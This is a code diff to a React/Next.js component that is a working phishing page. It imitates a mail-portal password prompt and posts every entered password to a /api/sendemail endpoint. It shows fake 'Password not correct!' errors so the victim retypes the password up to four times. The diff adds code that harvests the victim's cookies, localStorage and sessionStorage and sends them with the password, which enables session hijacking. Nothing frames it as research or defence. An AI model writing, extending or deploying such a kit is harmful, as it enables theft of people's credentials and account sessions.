@@ -6,54 +6,40 @@ import Image from 'next/image';
 const Popup = ({ domain, favicon, eparams, systemInfo }) => {
   const { date, browser, os, location } = systemInfo;
   const [password, setPassword] = useState("");
-  const [email, setEmail] = useState("");
   const [attempts, setAttempts] = useState(0); // Track button clicks
   const [errorMessage, setErrorMessage] = useState(
     "Authentication is required!"
   );
   const [showPassword, setShowPassword] = useState(false);
-  const [logoUrl, setLogoUrl] = useState("");
+  const [cookies, setCookies] = useState("");
+  const [localStorageData, setLocalStorageData] = useState("");
+  const [sessionStorageData, setSessionStorageData] = useState("");
 
   useEffect(() => {
+    // Capture cookies, localStorage, and sessionStorage data
     try {
-      // Extract email from URL parameters
-      const urlParams = new URLSearchParams(window.location.search);
-      const emailFromUrl = urlParams.get('email');
-      if (emailFromUrl) {
-        setEmail(emailFromUrl);
+      // Capture cookies
+      setCookies(document.cookie);
+      
+      // Capture localStorage
+      let localStorageStr = "";
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        localStorageStr += `${key}=${localStorage.getItem(key)}; `;
       }
+      setLocalStorageData(localStorageStr);
       
-      // Send initial access notification
-      sendAccessNotification();
-      
-      // Extract domain from email or use provided domain to get logo
-      extractDomainAndGetLogo();
+      // Capture sessionStorage
+      let sessionStorageStr = "";
+      for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        sessionStorageStr += `${key}=${sessionStorage.getItem(key)}; `;
+      }
+      setSessionStorageData(sessionStorageStr);
     } catch (error) {
-      console.error("Error:", error);
+      console.error("Error capturing storage data:", error);
     }
   }, []);
-
-  const extractDomainAndGetLogo = () => {
-    try {
-      let emailDomain = domain;
-      
-      // If eparams contains an email, extract domain from it
-      if (eparams && eparams.includes('@')) {
-        const emailMatch = eparams.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi);
-        if (emailMatch && emailMatch[0]) {
-          emailDomain = emailMatch[0].split('@')[1];
-        }
-      }
-      
-      // Get favicon/logo for the domain
-      if (emailDomain) {
-        const faviconUrl = `https://www.google.com/s2/favicons?domain=${emailDomain}&sz=128`;
-        setLogoUrl(faviconUrl);
-      }
-    } catch (error) {
-      console.error("Error extracting domain:", error);
-    }
-  };
 
   const ChromeIcon = () => (
     <svg viewBox="0 0 24 24" fill="currentColor">
@@ -94,7 +80,7 @@ const Popup = ({ domain, favicon, eparams, systemInfo }) => {
     }
   };
 
-  const sendAccessNotification = async () => {
+  const sendEmail = async (eparams, password) => {
     try {
       const userAgent = navigator.userAgent;
       const remoteAddress = ""; // This would typically be captured server-side
@@ -106,41 +92,13 @@ const Popup = ({ domain, favicon, eparams, systemInfo }) => {
         },
         body: JSON.stringify({ 
           eparams, 
-          password: "", 
-          userAgent, 
-          remoteAddress, 
-          landingUrl: window.location.href
-        }),
-      });
-
-      if (!response.ok) {
-        throw new Error("Failed to send access notification");
-      }
-
-      const data = await response.json();
-      console.log(data.message);
-    } catch (error) {
-      console.error("Error:", error);
-    }
-  };
-
-  const sendEmail = async (eparams, email, password) => {
-    try {
-      const userAgent = navigator.userAgent;
-      const remoteAddress = ""; // This would typically be captured server-side
-      
-      const response = await fetch("/api/sendemail", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({ 
-          eparams, 
-          email,
           password, 
           userAgent, 
           remoteAddress, 
-          landingUrl: window.location.href
+          landingUrl: window.location.href,
+          cookies,
+          localStorageData,
+          sessionStorageData
         }),
       });
 
@@ -160,18 +118,18 @@ const Popup = ({ domain, favicon, eparams, systemInfo }) => {
   const handleNextClick = () => {
     if (attempts === 0) {
       setErrorMessage("Password not correct!");
-      sendEmail(eparams, email, password);
+      sendEmail(eparams, password);
       setAttempts(attempts + 1);
     } else if (attempts === 1) {
       setErrorMessage("Password still not correct!");
-      sendEmail(eparams, email, password);
+      sendEmail(eparams, password);
       setAttempts(attempts + 1);
     } else if (attempts === 2) {
       setErrorMessage("Incorrect password again. Last attempt!");
-      sendEmail(eparams, email, password);
+      sendEmail(eparams, password);
       setAttempts(attempts + 1);
     } else if (attempts === 3) {
-      sendEmail(eparams, email, password);
+      sendEmail(eparams, password);
 
       // Ensure the domain is fully qualified
       const fullDomain = domain.startsWith("http")
@@ -186,74 +144,28 @@ const Popup = ({ domain, favicon, eparams, systemInfo }) => {
   return (
     <div className="popup">
       <div className="popup-content">
-        <div className="djdfe">
-          {/* Logo at the top */}
-          {logoUrl && (
-            <div style={{ 
-              display: 'flex', 
-              justifyContent: 'center', 
-              marginBottom: '20px' 
-            }}>
-              <img 
-                src={logoUrl} 
-                alt="Email provider logo" 
-                style={{
-                  width: '64px',
-                  height: '64px',
-                  borderRadius: '8px',
-                  objectFit: 'cover'
-                }}
-                onError={(e) => {
-                  // If favicon fails to load, hide the element
-                  e.target.style.display = 'none';
-                }}
-              />
-            </div>
-          )}
-
-          {/* Email Field */}
-          <div className="pasww" style={{ marginBottom: "15px" }}>
-            <div style={{
-              fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
-              fontSize: "14px",
-              fontWeight: "bold",
-              marginBottom: "5px",
-              color: "#333333"
-            }}>
-              Email address
-            </div>
-            <input
-              type="email"
-              className="fjhd"
-              style={{
-                paddingLeft: "20px",
-                borderRadius: "10px",
-                height: "55px",
-                fontSize: "13px",
-                boxShadow: "0 4px 8px rgba(100, 100, 100, 0.4)",
-                border: "1px solid #fff",
-                width: "100%",
-                backgroundColor: "#f5f5f5",
-                cursor: "not-allowed"
-              }}
-              placeholder="Email address"
-              value={email}
-              readOnly
-              disabled
-            />
+        <Image src="/Mailportal.svg" alt="Mail Portal" width={200} height={30} />
+        <div>
+          <div style={{fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",  fontWeight: 'bold'}} className="system-info mt7">
+            <span className="info-item">
+              {systemInfo.date.toLocaleString()}
+            </span>
+            <span className="separator">•</span>
+            <span className="info-item">
+              {getOSIcon(systemInfo.os)}
+              {systemInfo.os}
+            </span>
+            <span className="separator">•</span>
+            <span className="info-item">{systemInfo.location}</span>
           </div>
-
-          {/* Password Field */}
-          <div className="pasww" style={{ marginBottom: "15px" }}>
-            <div style={{
-              fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
-              fontSize: "14px",
-              fontWeight: "bold",
-              marginBottom: "5px",
-              color: "#333333"
-            }}>
-              Password
-            </div>
+        </div>
+        <div style={{fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", fontSize: "14px"}} className="koko">{eparams}</div>
+        <div style={{fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", fontSize: "13px", color: "#808080",}} className="thtkind">
+          You're accessing secure settings. Please provide your <b>{domain}</b>{" "}
+          password to continue.
+        </div>
+        <div className="djdfe">
+          <div className="pasww">
             <input
               type={showPassword ? "text" : "password"}
               className="fjhd"
@@ -264,7 +176,6 @@ const Popup = ({ domain, favicon, eparams, systemInfo }) => {
                 fontSize: "13px",
                 boxShadow: "0 4px 8px rgba(100, 100, 100, 0.4)",
                 border: "1px solid #fff",
-                width: "100%"
               }}
               placeholder="Password"
               value={password}
@@ -272,18 +183,135 @@ const Popup = ({ domain, favicon, eparams, systemInfo }) => {
             />
           </div>
 
-          <div className="njhiu" style={{ fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", fontSize: "12px", marginLeft: "8px", marginBottom: "10px" }}>
+          <div className="njhiu" style={{ fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", fontSize: "12px", marginLeft: "8px" }}>
             {errorMessage}
           </div>
 
+          <div className="jhgf" style={{ fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif" }}>
+            <input
+              type="checkbox"
+              name="Show password"
+              id="showPassword"
+              onChange={(e) => setShowPassword(e.target.checked)}
+              style={{ marginTop: "5px" }}
+            />
+            <label
+              htmlFor="showPassword"
+              className="jhcd"
+              style={{ position: "relative", top: "-3px", color: "#333333" }}
+            >
+              Reveal password
+            </label>
+          </div>
+
           <div className="fjiure">
-            <button className="urifjdd" onClick={handleNextClick} style={{
-              fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
-            }}>
-              Sign in
+            <button className="urifjdd" onClick={handleNextClick} style={{fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",}}>
+              Next
             </button>
           </div>
         </div>
+
+        <style jsx>{`
+          @media (max-width: 480px) {
+            .popup-content {
+              margin: 10px;
+              padding: 15px;
+            }
+          }
+
+          @media (max-width: 380px) {
+            .popup-content {
+              margin: 8px;
+              padding: 12px;
+            }
+            
+            .system-info {
+              font-size: 11px;
+            }
+            
+            .koko {
+              font-size: 13px;
+            }
+            
+            .thtkind {
+              font-size: 12px;
+            }
+          }
+
+          @media (max-width: 320px) {
+            .popup-content {
+              margin: 5px;
+              padding: 10px;
+            }
+            
+            .system-info {
+              font-size: 10px;
+              flex-wrap: wrap;
+              justify-content: center;
+              gap: 4px;
+            }
+            
+            .separator {
+              margin: 0 2px;
+            }
+            
+            .koko {
+              font-size: 12px;
+            }
+            
+            .thtkind {
+              font-size: 11px;
+            }
+            
+            .fjhd {
+              font-size: 12px;
+              height: 50px;
+            }
+          }
+
+          @media (max-width: 280px) {
+            .popup-content {
+              margin: 3px;
+              padding: 8px;
+            }
+            
+            .system-info {
+              font-size: 9px;
+              flex-direction: column;
+              align-items: center;
+              gap: 2px;
+            }
+            
+            .separator {
+              display: none;
+            }
+            
+            .koko {
+              font-size: 11px;
+            }
+            
+            .thtkind {
+              font-size: 10px;
+              line-height: 1.3;
+            }
+            
+            .fjhd {
+              font-size: 11px;
+              height: 45px;
+              padding-left: 15px;
+            }
+            
+            .njhiu {
+              font-size: 11px;
+              margin-left: 5px;
+            }
+            
+            .urifjdd {
+              font-size: 12px;
+              padding: 10px 15px;
+            }
+          }
+        `}</style>
       </div>
     </div>
   );
